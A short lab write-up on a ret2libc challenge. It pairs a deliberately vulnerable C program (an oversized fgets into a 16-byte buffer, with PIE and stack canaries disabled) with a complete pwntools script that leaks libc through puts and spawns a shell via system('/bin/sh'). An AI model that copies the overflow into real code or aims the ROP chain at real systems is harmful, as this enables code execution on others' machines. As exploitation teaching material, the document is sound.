---
sort : 8
---

# Multiple BOFs > Ret2Libc
> PIE Disabled & NO Canary 

the idea of the challenge is to leak the libc address from the first BOF, by creating a rop chain that will call `puts` from .plt and pass the `puts.got` as an arguemnt. kowing the leaked address we calculate the libc address and execute system in the next rop chain in the second BOF.

```c
#include<stdio.h>
#include<string.h>

void init_buffer(){
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}

void helper(void) {
  __asm__(
    "pop %rdi\n"
    "ret\n"
  );
}

void BOF(){
    char buf[0x10];
    fgets(buf, 0x100, stdin);
    size_t len = strcspn(buf, "\n");
    buf[len] = '\0';
}

void Exploit(){
    char buf[0x500]; // padding 

    BOF();
    puts("Hii");
    BOF();
}

void main(int argc, char **argv, char **envp){
    init_buffer();
    puts("Hii");
    Exploit();
}
```

```bash
$ gcc binary.c -o binary -no-pie
```

```python
from pwn import *

exe = ELF("./binary", checksec=False)
libc = ELF("./libc.so.6", checksec=False)  
context.binary = elf = exe
context.endian = 'little'
context.arch = 'amd64' 

io = process([exe.path])

rop = ROP(elf)
rop.raw(b'A'*40)
rop.raw(rop.ret.address)
rop.puts(elf.got["puts"])
rop.raw(elf.sym._start)

log.success(rop.dump())
io.sendlineafter(b'Hii\n', rop.chain())

leak = hex(unpack(io.recvline().rstrip(), "all"))
log.success(f'leaked puts.got = {leak}')
log.success(f'libc.symbols["puts"] = {hex(libc.symbols["puts"])}')

libc.address = int(leak, 16) - libc.symbols["puts"]
log.success(f'libc.address = {hex(libc.address)}')

bin_sh = next(libc.search(b'/bin/sh'))

rop2 = ROP(libc)
rop2.raw(b'A'*40)
rop2.raw(rop.ret.address)
rop2.system(bin_sh)

log.success(rop2.dump())
io.sendlineafter(b'Hii\n', rop2.chain())

io.interactive()
```